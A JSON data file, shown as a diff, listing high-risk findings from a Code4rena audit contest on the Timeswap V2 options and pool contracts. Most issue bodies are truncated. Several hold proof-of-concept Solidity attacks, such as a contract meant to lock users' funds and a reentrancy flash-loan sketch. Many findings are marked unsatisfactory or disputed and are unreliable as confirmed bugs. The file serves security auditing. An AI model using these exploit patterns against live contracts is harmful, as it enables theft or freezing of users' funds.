@@ -1,0 +1,564 @@
+{
+  "contest": "2023-01-timeswap",
+  "issues": [
+    {
+      "number": 297,
+      "title": "A Malicious User can Lock All Funds in an Option",
+      "labels": [
+        "bug",
+        "3 (High Risk)",
+        "sponsor disputed",
+        "unsatisfactory"
+      ],
+      "body": "# Lines of code\n\nhttps://github.com/code-423n4/2023-01-timeswap/blob/ef4c84fb8535aad8abd6b67cc45d994337ec4514/packages/v2-option/src/TimeswapV2Option.sol#L109\nhttps://github.com/code-423n4/2023-01-timeswap/blob/ef4c84fb8535aad8abd6b67cc45d994337ec4514/packages/v2-option/src/TimeswapV2Option.sol#L157\n\n\n# Vulnerability details\n\n## Impact\n\nBy calling the mint and burn functions with the 'amount0' and 'amount1' equal to the the option pair's respective balances of token0 and token1, a user can cause a given option's \"Option.totalLong0\" and \"Option.totalLong1\" to both be set to 0. The effect of this is that no user will be able to withdraw or modify their existing positions because all calls to \"transferPosition\", \"burn\", \"swap\", and \"collect\" will revert. This effectively will lock away the funds of users that have positions for the affected option.\n\n## Proof of Concept\n\nHere is an example of how this vulnerability could be exploited:\n```\ncontract Attacker is ITimeswapV2OptionMintCallback,ITimeswapV2OptionBurnCallback {\n\n  address public token0;\n  address public token1;\n\n  bool public firstMint = true;\n\n  function lockFunds(address optionPair) external {\n\n    token0 = ITimeswapV2Option(optionPair).token0();\n    token1 = ITimeswapV2Option(optionPair).token1();\n\n    uint256 maturity = block.timestamp + 100;\n\n    // This initial mint call is needed to ensure that the transaction will not revert on line 192 when\n    // the burn function subsequently is called. \n    ITimeswapV2Option(optionPair).mint(\n      TimeswapV2OptionMintParam({\n        strike:1,\n        maturity: maturity,\n        long0To: address(this),\n        long1To: address(this),\n        shortTo: address(this),\n        transaction: TimeswapV2OptionMint.GivenShorts,\n        amount0:0,\n        amount1:1,\n        data: ''\n      })\n    );\n\n    firstMint = false;\n\n    uint256 amount0 = IERC20(token0).balanceOf(optionPair);\n    uint256 amount1 = IERC20(token1).balanceOf(optionPair);\n\n    // Request that a position is "
+    },
+    {
+      "number": 295,
+      "title": "Burn will not work if positions below to different owners",
+      "labels": [
+        "bug",
+        "3 (High Risk)",
+        "unsatisfactory"
+      ],
+      "body": "# Lines of code\n\nhttps://github.com/code-423n4/2023-01-timeswap/blob/ef4c84fb8535aad8abd6b67cc45d994337ec4514/packages/v2-option/src/TimeswapV2Option.sol#L190-L192\n\n\n# Vulnerability details\n\n## Impact\nWhen an option is created, the caller has an option of choosing any address to mint these three option positions to (`long0`, `long1`, `short`) or if the caller chooses (the options can be added for the caller alone ). \n\nThe positon(s) could be [transferred](https://github.com/code-423n4/2023-01-timeswap/blob/main/packages/v2-option/src/structs/Option.sol#L60-L69) through `transferPosition` by whomever owns  either of the aforementioned options at any given time but there's an issue in `burn`  if the owners of atleast one of the positions is different.\n\nWhen the positions are burnt, there's a requirement that the `msg.sender` is the owner of all the positions, if for instance an address owns two option (`long0`, `long1`) but transferred or had chosen another address during the minting process, the reduction in the position not owned by the caller would revert here due to an [underflow](https://github.com/code-423n4/2023-01-timeswap/blob/ef4c84fb8535aad8abd6b67cc45d994337ec4514/packages/v2-option/src/TimeswapV2Option.sol#L190-L192). Also, the caller(s) are expected to supply amount 0 and amount 1 which cannot be [zero](https://github.com/code-423n4/2023-01-timeswap/blob/ef4c84fb8535aad8abd6b67cc45d994337ec4514/packages/v2-option/src/structs/Param.sol#L124), in order to calculate the amount of `long0`, `long1` and `short` to be burnt.\n\nIf the positions based on the current logic are permitted to be owned  by anyone or can be transferred, the implementation of  `burn` would be incorrect,ie, all three position owners could not offload their position(s) at the same time.\n\nHere's a modification to the current POC showing this issue :\n\n```solidity function testBurnGivenShorts(uint256 strike, uint256 amount0, uint256 amount1, uint256 burnAmount0, uint256 burnAmount1) public { "
+    },
+    {
+      "number": 283,
+      "title": "ATTACKER CAN STEAL FUNDS BECAUSE OF REENTRANCY VULNERABILITY IN `burn` METHOD ",
+      "labels": [
+        "bug",
+        "3 (High Risk)",
+        "sponsor disputed",
+        "unsatisfactory"
+      ],
+      "body": "# Lines of code\n\nhttps://github.com/code-423n4/2023-01-timeswap/blob/main/packages/v2-option/src/TimeswapV2Option.sol#L157-L195\n\n\n# Vulnerability details\n\n## Impact\n\nIn `burn` method of `TimeswapV2Option` contract, there is no Reentrancy guard. The method allows a Callback function before updating the State variable, which makes method vulnerable for Reentrancy which can lead to steal of funds.\n\n## Proof of Concept\n\n```solidity\nFile: packages/v2-option/src/TimeswapV2Option.sol\n\n      function burn(\n          TimeswapV2OptionBurnParam calldata param\n      ) external override noDelegateCall returns (uint256 token0AndLong0Amount, uint256 token1AndLong1Amount, uint256 shortAmount, bytes memory data) {\n          if (!hasInteracted[param.strike][param.maturity]) Error.inactiveOptionChoice(param.strike, param.maturity);\n          ParamLibrary.check(param, blockTimestamp());\n\n          Option storage option = options[param.strike][param.maturity];\n\n          // does main burn logic calculation\n          (token0AndLong0Amount, token1AndLong1Amount, shortAmount) = option.burn(param.strike, param.transaction, param.amount0, param.amount1);\n\n          // update token0 and token1 balance target for any previous concurrent option transactions.\n          processing.updateProcess(token0AndLong0Amount, token1AndLong1Amount, false, false);\n\n          // transfer token0 amount to recipient.\n          if (token0AndLong0Amount != 0) IERC20(token0).safeTransfer(param.token0To, token0AndLong0Amount);\n\n          // transfer token1 amount to recipient.\n          if (token1AndLong1Amount != 0) IERC20(token1).safeTransfer(param.token1To, token1AndLong1Amount);\n\n          // skip callback if there is no data.\n          if (param.data.length != 0)\n              data = ITimeswapV2OptionBurnCallback(msg.sender).timeswapV2OptionBurnCallback(\n                  TimeswapV2OptionBurnCallbackParam({\n                      strike: param.strike,\n                      maturity: param.maturity,\n            "
+    },
+    {
+      "number": 269,
+      "title": "Rebalance logic is wrong and this distorts the pool's important states",
+      "labels": [
+        "bug",
+        "3 (High Risk)",
+        "satisfactory",
+        "selected for report",
+        "sponsor confirmed",
+        "H-01"
+      ],
+      "body": "# Lines of code\n\nhttps://github.com/code-423n4/2023-01-timeswap/blob/ef4c84fb8535aad8abd6b67cc45d994337ec4514/packages/v2-pool/src/structs/Pool.sol#L679\n\n\n# Vulnerability details\n\n## Impact\nThe important states including `long0Balance, long1Balance, long1FeeGrowth, long1ProtocolFees` are wrongly calculated and it breaks the pool's invariant.\n\n## Proof of Concept\nThe protocol provides a rebalancing functionality and the main logic is implemented in the library `Pool.sol`.\nIf `param.isLong0ToLong1` is true and the transaction is `TimeswapV2PoolRebalance.GivenLong1`, the protocol calculates the `long1AmountAdjustFees` first and the actual `long0Amount, longFees` and the final `long1Balance` is decided accordingly.\nThe problem is it is using the wrong parameter `pool.long0Balance` while it is supposed to use `pool.long1Balance` in the line L679.\n\nThis leads to wrong state calculation in the following logic. (especially L685 is setting the `long1Balance` to zero).\nFurthermore, the protocol is designed as a permission-less one and anyone can call `TimeswapV2Pool.rebalance()`.\nAn attacker can abuse this to break the pool's invariant and take profit leveraging that.\n\n```solidity\npackages\\v2-pool\\src\\structs\\Pool.sol\n665:     function rebalance(Pool storage pool, TimeswapV2PoolRebalanceParam memory param, uint256 transactionFee, uint256 protocolFee) external returns (uint256 long0Amount, uint256 long1Amount) {\n666:         if (pool.liquidity == 0) Error.requireLiquidity();\n667:\n668:         // No need to update short fee growth.\n669:\n670:         uint256 longFees;\n671:         if (param.isLong0ToLong1) {\n672:             if (param.transaction == TimeswapV2PoolRebalance.GivenLong0) {\n673:                 (long1Amount, longFees) = ConstantSum.calculateGivenLongIn(param.strike, long0Amount = param.delta, transactionFee, true);\n674:\n675:                 if (long1Amount == 0) Error.zeroOutput();\n676:\n677:                 pool.long1Balance -= (long1Amount + longFees);\n678:        "
+    },
+    {
+      "number": 265,
+      "title": "Improper check for Zero Address",
+      "labels": [
+        "bug",
+        "3 (High Risk)",
+        "unsatisfactory"
+      ],
+      "body": "# Lines of code\n\nhttps://github.com/code-423n4/2023-01-timeswap/blob/ef4c84fb8535aad8abd6b67cc45d994337ec4514/packages/v2-pool/src/TimeswapV2PoolFactory.sol#L63\n\n\n# Vulnerability details\n\n## Impact\nDetailed description of the impact of this finding.\n\nThere is an error in the if statement of the referenced line of code. It should check for zero address and return an error. \n\nThis will prevent the creating a new contract for an existing option pair, even if there is no existing contract for that option pair.\n\n## Proof of Concept\nProvide direct links to all referenced code in GitHub. Add screenshots, logs, or any other relevant proof that illustrates the concept.\n\nhttps://github.com/code-423n4/2023-01-timeswap/blob/ef4c84fb8535aad8abd6b67cc45d994337ec4514/packages/v2-pool/src/TimeswapV2PoolFactory.sol#L63\n\n## Tools Used\n\nManual Review\n\n## Recommended Mitigation Steps\n\nChange the affected line to \"if (pair == address(0)) Error.zeroAddress();\" to properly compare 'pair' to zero addresses"
+    },
+    {
+      "number": 258,
+      "title": "Allows burning from other accounts",
+      "labels": [
+        "bug",
+        "3 (High Risk)",
+        "unsatisfactory"
+      ],
+      "body": "# Lines of code\n\nhttps://github.com/code-423n4/2023-01-timeswap/blob/ef4c84fb8535aad8abd6b67cc45d994337ec4514/packages/v2-pool/src/structs/Pool.sol#L452-L455\nhttps://github.com/code-423n4/2023-01-timeswap/blob/ef4c84fb8535aad8abd6b67cc45d994337ec4514/packages/v2-pool/src/structs/Pool.sol#L364\n\n\n# Vulnerability details\n\n## Impact\nAnyone can burn the liquidamount before maturity by calling burn() in Pool.sol\n\n## Proof of Concept\n364 : liquidityPosition.mint(liquidityAmount);\nhttps://github.com/code-423n4/2023-01-timeswap/blob/ef4c84fb8535aad8abd6b67cc45d994337ec4514/packages/v2-pool/src/structs/Pool.sol#L364\n\nliquidityAmount is minted by liquidityPosition but when burned, it is not clear who will burn liquidityAmount\n\n452: if (long0Amount != 0) pool.long0Balance -= long0Amount;\n453: if (long1Amount != 0) pool.long1Balance -= long1Amount;\n454:\n455: pool.liquidity -= liquidityAmount;\nhttps://github.com/code-423n4/2023-01-timeswap/blob/ef4c84fb8535aad8abd6b67cc45d994337ec4514/packages/v2-pool/src/structs/Pool.sol#L452-L455\n\n\n## Tools Used\nManual Review\n## Recommended Mitigation Steps\nAdd liquidityPosition.burn(liquidityAmount)\n\n452: if (long0Amount != 0) pool.long0Balance -= long0Amount;\n453: if (long1Amount != 0) pool.long1Balance -= long1Amount;\n454:+ liquidityPosition.burn(liquidityAmount)\n455: pool.liquidity -= liquidityAmount;"
+    },
+    {
+      "number": 251,
+      "title": "In `TimeswapV2LiquidityToken.sol` and `TimeswapV2Token.sol`, different positions might be minted to the same id.",
+      "labels": [
+        "bug",
+        "3 (High Risk)",
+        "satisfactory",
+        "sponsor confirmed",
+        "duplicate-219"
+      ],
+      "body": "# Lines of code\n\nhttps://github.com/code-423n4/2023-01-timeswap/blob/ef4c84fb8535aad8abd6b67cc45d994337ec4514/packages/v2-token/src/base/ERC1155Enumerable.sol#L154-L163\nhttps://github.com/code-423n4/2023-01-timeswap/blob/ef4c84fb8535aad8abd6b67cc45d994337ec4514/packages/v2-token/src/base/ERC1155Enumerable.sol#L36\nhttps://github.com/code-423n4/2023-01-timeswap/blob/ef4c84fb8535aad8abd6b67cc45d994337ec4514/packages/v2-token/src/TimeswapV2LiquidityToken.sol#L113-L117\n\n\n# Vulnerability details\n\n## Impact\nIn this protocol, all positions should have unique ids to track and update their status.\n\nCurrently, different positions might be minted to the same id and the main logic for the positions will be broken.\n\n## Proof of Concept\n`TimeswapV2LiquidityToken.mint()` sets the id for new positions using `totalSupply() + 1`.\n\n```solidity\nfunction mint(TimeswapV2LiquidityTokenMintParam calldata param) external returns (bytes memory data) {\n    ParamLibrary.check(param);\n\n    TimeswapV2LiquidityTokenPosition memory timeswapV2LiquidityTokenPosition = TimeswapV2LiquidityTokenPosition({\n        token0: param.token0,\n        token1: param.token1,\n        strike: param.strike,\n        maturity: param.maturity\n    });\n\n    bytes32 key = timeswapV2LiquidityTokenPosition.toKey();\n    uint256 id = _timeswapV2LiquidityTokenPositionIds[key];\n\n    // if the position does not exist, create it\n    if (id == 0) {\n        id = totalSupply() + 1;\n        _timeswapV2LiquidityTokenPositions[id] = timeswapV2LiquidityTokenPosition;\n        _timeswapV2LiquidityTokenPositionIds[key] = id;\n    }\n```\n\nAnd `ERC1155Enumerable.totalSupply()` returns the length of `_allTokens`.\n\n```solidity\n    function totalSupply() public view override returns (uint256) {\n        return _allTokens.length;\n    }\n```\n\nBut as we can see from `ERC1155Enumerable._removeTokenFromAllTokensEnumeration()`, the length of `_allTokens` can be decreased with the zero total supply token.\n\n```\nfunction _removeTokenFromAllTokensEnumeration("
+    },
+    {
+      "number": 249,
+      "title": "User can open position without depositing tokens",
+      "labels": [
+        "bug",
+        "3 (High Risk)",
+        "unsatisfactory"
+      ],
+      "body": "# Lines of code\n\nhttps://github.com/code-423n4/2023-01-timeswap/blob/ef4c84fb8535aad8abd6b67cc45d994337ec4514/packages/v2-token/src/TimeswapV2Token.sol#L76-L195\nhttps://github.com/code-423n4/2023-01-timeswap/blob/ef4c84fb8535aad8abd6b67cc45d994337ec4514/packages/v2-token/src/TimeswapV2Token.sol#L172\n\n\n# Vulnerability details\n\n## Impact\n\nUser can mint long/short tokens without depositing anything. This is because the function on LN 172 doesn't check the contents of the returned data from the function, and the function doesn't verify that the contract has indeed received the expected tokens.\n\n## Proof of Concept\n\nFirst I changed the constructor to give the `msg.sender` only 10 tokens. This allowed me to test whether the `mint` function worked even when the user didn't have enough tokens to deposit.\n\n```\nconstructor(string memory _name, string memory _symbol) ERC20(_name, _symbol) {\n        _mint(msg.sender, 10);\n    }\n```\n\nUsing the existing test in `TimeswapV2Token.t.sol` I added a few `console.log` to check that the token contract didn't receive the tokens from the user as at this point the user didn't have any.\n\n```\nfunction testMint(uint256 strike, uint256 maturity, uint256 token0Amount, uint256 token1Amount) public {\n        // opPair.mint()\n        // token0Amount = 10\n        token0Amount = 10;\n        token1Amount = 10;\n        vm.assume(strike > 0 && maturity > block.timestamp && maturity < type(uint96).max && token0Amount > 0 && token1Amount > 0);\n\n        console.log(block.timestamp);\n        setUp();\n        console.log(\"initial done\");\n        bytes memory data;\n        (long0Amount, long1Amount, shortAmount, data) = ITimeswapV2Option(opPair).mint(\n            TimeswapV2OptionMintParam({\n                strike: strike,\n                maturity: maturity,\n                long0To: address(this),\n                long1To: address(this),\n                shortTo: address(this),\n                transaction: TimeswapV2OptionMint.GivenTokensAndLongs,\n             "
+    },
+    {
+      "number": 223,
+      "title": "Lack of access control in certain functions within TimeswapV2LiquidityToken & TimeswapV2LiquidityToken contracts",
+      "labels": [
+        "bug",
+        "3 (High Risk)",
+        "unsatisfactory"
+      ],
+      "body": "# Lines of code\n\nhttps://github.com/code-423n4/2023-01-timeswap/blob/main/packages/v2-token/src/TimeswapV2LiquidityToken.sol#L99\nhttps://github.com/code-423n4/2023-01-timeswap/blob/main/packages/v2-token/src/TimeswapV2LiquidityToken.sol#L150\nhttps://github.com/code-423n4/2023-01-timeswap/blob/main/packages/v2-token/src/TimeswapV2LiquidityToken.sol#L182\nhttps://github.com/code-423n4/2023-01-timeswap/blob/main/packages/v2-token/src/TimeswapV2Token.sol#L76\nhttps://github.com/code-423n4/2023-01-timeswap/blob/main/packages/v2-token/src/TimeswapV2Token.sol#L198\n\n\n# Vulnerability details\n\n## Impact\nThe TimeswapV2Token & TimeswapV2LiquidityToken contracts lack proper access control in sensitive functions such as mint(), burn(), collectFees(), and updateFees(). There is no modifier or \"require\"  to check if the caller is allowed to call these functions. This can result in the loss of user funds, Tokens price manipulations, and other vulnerabilities.\n\n## Proof of Concept\nhttps://github.com/code-423n4/2023-01-timeswap/blob/main/packages/v2-token/src/TimeswapV2LiquidityToken.sol#L99\nhttps://github.com/code-423n4/2023-01-timeswap/blob/main/packages/v2-token/src/TimeswapV2LiquidityToken.sol#L150\nhttps://github.com/code-423n4/2023-01-timeswap/blob/main/packages/v2-token/src/TimeswapV2LiquidityToken.sol#L182\nhttps://github.com/code-423n4/2023-01-timeswap/blob/main/packages/v2-token/src/TimeswapV2Token.sol#L76\nhttps://github.com/code-423n4/2023-01-timeswap/blob/main/packages/v2-token/src/TimeswapV2Token.sol#L198\n\n## Tools Used\nManual\n\n## Recommended Mitigation Steps\nConsider adding a modifier to grant access only to the admin."
+    },
+    {
+      "number": 219,
+      "title": "TimeswapV2LiquidityToken should not use totalSupply()+1 as tokenId",
+      "labels": [
+        "bug",
+        "3 (High Risk)",
+        "primary issue",
+        "satisfactory",
+        "selected for report",
+        "upgraded by judge",
+        "edited-by-warden",
+        "H-02"
+      ],
+      "body": "# Lines of code\n\nhttps://github.com/code-423n4/2023-01-timeswap/blob/main/packages/v2-token/src/TimeswapV2LiquidityToken.sol#L114\nhttps://github.com/code-423n4/2023-01-timeswap/blob/main/packages/v2-token/src/TimeswapV2Token.sol#L103\n\n\n# Vulnerability details\n\n## Impact\n\nAssuming ERC1155Enumerable is acting normally, there is a **Accounting Issue** about TimeswapV2LiquidityToken and TimeswapV2Token's tokenId.\n\nDifferent liquidities can have the same `tokenId`, leading to serious balance manipulation.\n\nI'm submitting this issue as medium because current implementation ERC1155Enumerable is wrong, which exactly mitigate this issue making it not exploitable. But this issue will become dangerous once we fixed ERC1155Enumerable.\n\n## Proof of Concept\n\nIn this PoC, the attacker will do these steps:\n1. Add liquidity of token0 and token1, thus receive TimeswapV2LiquidityToken tokenId 1.\n2. Add liquidity of token2 and token3, thus receive TimeswapV2LiquidityToken tokenId 2.\n3. Burn his liquidity from step1, which will make totalSupply decrease (if ERC1155Enumerable  has been patched)\n4. Add liquidity of token4 and token5, and receive TimeswapV2LiquidityToken tokenId 2. This is wrong tokenId, which should be 3.\n\nExplanation:\n\nhttps://github.com/code-423n4/2023-01-timeswap/blob/main/packages/v2-token/src/TimeswapV2LiquidityToken.sol#L112\n\nAs the comment said `if the position does not exist, create it`, but the new tokenId is set as `totalSupply() + 1`\n\nFunction totalSupply is defined in `packages/v2-token/src/base/ERC1155Enumerable.sol`, which is simply _allTokens.length: https://github.com/code-423n4/2023-01-timeswap/blob/main/packages/v2-token/src/base/ERC1155Enumerable.sol#L37-L38\n\n_allTokens.length can be decreased in `_removeTokenFromAllTokensEnumeration` function, which is called by `_removeTokenEnumeration`, and by `_afterTokenTransfer`. In simple words, when all token amounts for a specific tokenId are burned (`_idTotalSupply[id] == 0`), totalSupply should be decreased.\n"
+    },
+    {
+      "number": 206,
+      "title": "[H-01] Lack of access control allow attacker to transferTokenPositionFrom()with other user's wallet balance",
+      "labels": [
+        "bug",
+        "3 (High Risk)",
+        "unsatisfactory"
+      ],
+      "body": "# Lines of code\n\nhttps://github.com/code-423n4/2023-01-timeswap/blob/ef4c84fb8535aad8abd6b67cc45d994337ec4514/packages/v2-token/src/TimeswapV2Token.sol#L71-L72\n\n\n# Vulnerability details\n\n## Impact\nThis issue allows anyone to transferTokenPositionFrom() and steal almost all their wallet balances for all the users who have approved the contract before.\n\n## Proof of Concept\nFunds are transferred from the from parameter, and the output tokens are transferred to the to parameter, both passed by the caller without proper access control.\nhttps://github.com/code-423n4/2023-01-timeswap/blob/ef4c84fb8535aad8abd6b67cc45d994337ec4514/packages/v2-token/src/TimeswapV2Token.sol#L71-L72\n\n## Tools Used\nManual Review\n\n## Recommended Mitigation Steps\nCheck the from and to parameters before executing the safeTransferFrom() function."
+    },
+    {
+      "number": 200,
+      "title": "Timeswap Options has no reentry check and is providing a set of flashloan with no fees",
+      "labels": [
+        "bug",
+        "3 (High Risk)",
+        "unsatisfactory",
+        "edited-by-warden"
+      ],
+      "body": "# Lines of code\n\nhttps://github.com/code-423n4/2023-01-timeswap/blob/ef4c84fb8535aad8abd6b67cc45d994337ec4514/packages/v2-option/src/TimeswapV2Option.sol#L109-L195\n\n\n# Vulnerability details\n\n## high-flashloan-provider @timeswap\n\n## Impact\nIn the file `/package/v2-option/TimeswapV2Option.sol`, There are a range of functions that has no Reentry check. As a consequence, when the contract call back `msg.sender`, an attacker can then reeentry in his own callee contract. As an example, A user can call `burn` function first (even he has no long or short positions) and use the fund Timeswap Option transfers to  do a range of things (works as a flash loan) and then call the `mint` function to mint. After that in the burn function,`msg.sender` positions are then burned. Such operations provides a no-fee flash loan for adverse attackers and can harm the project.\n\nA brief example of attacking can be seen here:\n\n ```\npragma solidity ^0.8.7;    \nenum TimeswapV2OptionMint {\n        GivenTokensAndLongs,\n        GivenShorts\n    }\n    enum TimeswapV2OptionBurn {\n        GivenTokensAndLongs,\n        GivenShorts\n    }\n    struct TimeswapV2OptionBurnParam {\n        uint256 strike;\n        uint256 maturity;\n        address token0To;\n        address token1To;\n        TimeswapV2OptionBurn transaction;\n        uint256 amount0;\n        uint256 amount1;\n        bytes data;\n    }\n    struct TimeswapV2OptionMintParam {\n        uint256 strike;\n        uint256 maturity;\n        address long0To;\n        address long1To;\n        address shortTo;\n        TimeswapV2OptionMint transaction;\n        uint256 amount0;\n        uint256 amount1;\n        bytes data;\n    }\ninterface Option {\n\n\tfunction mint(\n        TimeswapV2OptionMintParam calldata param\n    ) external returns (uint256 token0AndLong0Amount, uint256 token1AndLong1Amount, uint256 shortAmount, bytes memory data);\n    function burn(\n        TimeswapV2OptionBurnParam calldata param\n    ) external returns (uint256 token0AndLong0Amount, uint256 tok"
+    },
+    {
+      "number": 194,
+      "title": "A malicious rebalancer can imbalance the `constant sum` nature of long token pool by depositing a larger number of input tokens for a smaller number of output tokens. This also imbalances the `constant product` nature of 3 token pool",
+      "labels": [
+        "bug",
+        "3 (High Risk)",
+        "sponsor disputed",
+        "unsatisfactory"
+      ],
+      "body": "# Lines of code\n\nhttps://github.com/code-423n4/2023-01-timeswap/blob/ef4c84fb8535aad8abd6b67cc45d994337ec4514/packages/v2-pool/src/TimeswapV2Pool.sol#L497\n\n\n# Vulnerability details\n\n## Impact\n`Token0` and `Token1` follow the properties of a `constant sum` pool. delta_x (token0 change) is balanced proportionately by delta_y (token1 change adjusted for strike). Arbitrageurs can use the `constant sum` property to rebalance the pool based on the level of `strike` viz-a-viz the DEX spot\n\nThis balance can be broken when a malicious user deposits a disproportionately large amount of a specific token in exchange for a smaller amount of alternate token. Doing this will increase the total number of long tokens in the pool & will further imbalance the `constant product` properties of 3-tooken pool that includes short tokens.\n\n`rebalance` function in [TimeswapV2Pool.sol](https://github.com/code-423n4/2023-01-timeswap/blob/ef4c84fb8535aad8abd6b67cc45d994337ec4514/packages/v2-pool/src/TimeswapV2Pool.sol#L469) has a callback that expects the rebalancer to transfer `input` tokens into the pool inexchange for `output` tokens. `checkEnough` function on line 510 checks if the number of input tokens deposited by user is higher than the `target` amount (calculated to ensure the constant-sum nature of pool).\n\nThere is no cap on deposits as user can deposit any amount of `input` tokens so long as the number of deposited tokens is atleast equal to target. A malicious user can deposit a large number of `input` tokens creating an imbalance in the pool & breaking the `(x+y)*z = K` nature of 3 token pool.\n\nUser would no doubt lose his tokens but will distort the interest rates & pool balances that can cause losses to LP's and lenders of pool.\n\n## Proof of Concept\nI pick same example from white paper\n\n- Suppose there are 100 long ETH and 100,000 long USD (x=100, y=100). strike is 1000 USD and spot is 1800 USD\n- Bob mints 200,000 long USD and 200 short by depositing 200,000 USD\n- Bob withdraws 1"
+    },
+    {
+      "number": 192,
+      "title": "Malicious lender can create pool imbalance by tricking V2 pool into accepting disproportionately large number of long tokens in exchange for short tokens",
+      "labels": [
+        "bug",
+        "3 (High Risk)",
+        "sponsor disputed",
+        "unsatisfactory"
+      ],
+      "body": "# Lines of code\n\nhttps://github.com/code-423n4/2023-01-timeswap/blob/ef4c84fb8535aad8abd6b67cc45d994337ec4514/packages/v2-pool/src/TimeswapV2Pool.sol#L403\nhttps://github.com/code-423n4/2023-01-timeswap/blob/ef4c84fb8535aad8abd6b67cc45d994337ec4514/packages/v2-pool/src/structs/Pool.sol#L532\n\n\n# Vulnerability details\n\n## Impact\nTimeswap V2 Pool works on constant product AMM where the total long tokens & short tokens follow the equation `total long * total short = L`. Any increase in short tokens caused by lenders has to be accompanied with a proportionate drop in long tokens to keep the interest rates/pool balanced.\n\n`Deleverage` function can be exploited by a lender by tricking the pool into accepting a very large number of long tokens in exchange for short tokens. In effect, lender exchanges a large amount of long tokens in any ratio irrespective of the constant product AMM constraint, thus creating an imbalance.\n\nWhile this will surely cause a loss to lender (lending amount cannot be fully redeemed because of loss of long tokens), such an imbalance can distort marginal interest rates and cause losses to LPs and lenders\n\n`Deleverage` function in [TimeswapV2Pool.sol](https://github.com/code-423n4/2023-01-timeswap/blob/ef4c84fb8535aad8abd6b67cc45d994337ec4514/packages/v2-pool/src/TimeswapV2Pool.sol#L403) uses 2 levels of callbacks that control how many `long0`/`long` tokens are deposited into the pool and how many `short` tokens are transferred out of the pool.\n\n**Inner callback**: `timeswapV2PoolDeleverageChoiceCallback` in [Pool.sol](https://github.com/code-423n4/2023-01-timeswap/blob/ef4c84fb8535aad8abd6b67cc45d994337ec4514/packages/v2-pool/src/structs/Pool.sol#L532) allows users to specify composition of `long0` and `long1` tokens subject to `long0 + long1 >= long`. Purpose of this callback is to give user a choice of what tokens (s)he intends to deposit subject to a floor on the sum of long amount (which is calculated from constant product AMM)\n\n**Outer callback*"
+    },
+    {
+      "number": 191,
+      "title": "Malicious borrower can create pool imbalance by tricking the V2 pool to send lesser number of long tokens in exchange for short tokens",
+      "labels": [
+        "bug",
+        "3 (High Risk)",
+        "sponsor disputed",
+        "unsatisfactory"
+      ],
+      "body": "# Lines of code\n\nhttps://github.com/code-423n4/2023-01-timeswap/blob/ef4c84fb8535aad8abd6b67cc45d994337ec4514/packages/v2-pool/src/TimeswapV2Pool.sol#L453\nhttps://github.com/code-423n4/2023-01-timeswap/blob/ef4c84fb8535aad8abd6b67cc45d994337ec4514/packages/v2-pool/src/structs/Pool.sol#L615\n\n\n# Vulnerability details\n\n## Impact\nTimeswap V2 Pool works on constant product AMM where total long tokens & short tokens follow the equation `total long * total short = L`. Any increase in long tokens has to be accompanied with a proportionate drop in short tokens (and viceversa) to ensure that pool functions normally.\n\n`Leverage` function can be exploited by a malicious borrower by tricking the pool into sending a very small number of long tokens in exchange for short tokens. In effect, tokens can be exchanged in any ratio irrespective of the constant product AMM constraint creating an imbalance.\n\nWhile this surely causes a loss to borrower (trapped collateral can never be redeemed because of loss of long tokens), such an imbalance can distort marginal interest rates and cause losses to other honest LPs and lenders\n\n`leverage` function in [TimeswapV2Pool.sol](https://github.com/code-423n4/2023-01-timeswap/blob/ef4c84fb8535aad8abd6b67cc45d994337ec4514/packages/v2-pool/src/TimeswapV2Pool.sol#L430) uses 2 levels of callbacks that control how many `short` tokens are deposited into the pool and how many `long0` and `long1` tokens are transferred out of the pool.\n\n**Inner callback**: `timeswapV2PoolLeverageChoiceCallback` in [Pool.sol](https://github.com/code-423n4/2023-01-timeswap/blob/ef4c84fb8535aad8abd6b67cc45d994337ec4514/packages/v2-pool/src/structs/Pool.sol#L615) allows users to specify composition of `long0` and `long1` tokens subject to `long0 + long1 < long`.\n\nPurpose of this callback is to give user a choice of what tokens (s)he intends to withdraw subject to a cap on the sum of long amount (which is calculated from constant product AMM)\n\n**Outer callback**: `timeswapV2Poo"
+    },
+    {
+      "number": 187,
+      "title": "User receives lesser number of `Long` Tokens on burning Pool liquidity resulting in loss of user funds",
+      "labels": [
+        "bug",
+        "3 (High Risk)",
+        "primary issue",
+        "sponsor disputed",
+        "unsatisfactory"
+      ],
+      "body": "# Lines of code\n\nhttps://github.com/code-423n4/2023-01-timeswap/blob/ef4c84fb8535aad8abd6b67cc45d994337ec4514/packages/v2-pool/src/TimeswapV2Pool.sol#L335\nhttps://github.com/code-423n4/2023-01-timeswap/blob/ef4c84fb8535aad8abd6b67cc45d994337ec4514/packages/v2-pool/src/structs/Pool.sol#L438\nhttps://github.com/code-423n4/2023-01-timeswap/blob/ef4c84fb8535aad8abd6b67cc45d994337ec4514/packages/v2-library/src/Error.sol#L152\n\n\n# Vulnerability details\n\n## Impact\nProtocol currently uses 2 levels of callbacks for burning Pool liquidity:\n\n**Inner callback** - `timeswapV2PoolBurnChoiceCallback` function in [Line 438 of Pool.sol](https://github.com/code-423n4/2023-01-timeswap/blob/ef4c84fb8535aad8abd6b67cc45d994337ec4514/packages/v2-pool/src/structs/Pool.sol#L438) allows user to specify `long0` & `long1` amount such that `long0 + long1 < longAmount`. `longAmount` here refers to the amount of long tokens calculated by Constant Product AMM to be returned to user for burning a specifc amount of pool liquidity. This check is done by `checkEnough` function in line 450.\n\nPurpose of this callback is to provide users a choice to decide composition of long0 & long1 (protocol only cares about the sum of tokens & not individual levels).\n\n**Outer callback** - the `long0`, `long1`, `short` tokens returned by `pool.mint` function are then passed to second callback in [Line 343 of TimeswapV2Pool.sol](https://github.com/code-423n4/2023-01-timeswap/blob/ef4c84fb8535aad8abd6b67cc45d994337ec4514/packages/v2-pool/src/TimeswapV2Pool.sol#L343). Note that pool also transfers `long0` and `long1` tokens to the user.\n\nProblem here is that if user passes a lower number of `long0` and `long1` tokens such that `long0 + long1 < long`, proportion of long tokens returned to the user will be inconsistent with the liquidity burnt by the pool. While the liquidity burnt is consistent with the constant AMM calculation corresponding to `long` amount, actual tokens sent by the pool are the lower numbers chosen by us"
+    },
+    {
+      "number": 186,
+      "title": "Loss of `Long` tokens when users send excess tokens to pool while minting LP tokens",
+      "labels": [
+        "bug",
+        "3 (High Risk)",
+        "unsatisfactory",
+        "duplicate-187"
+      ],
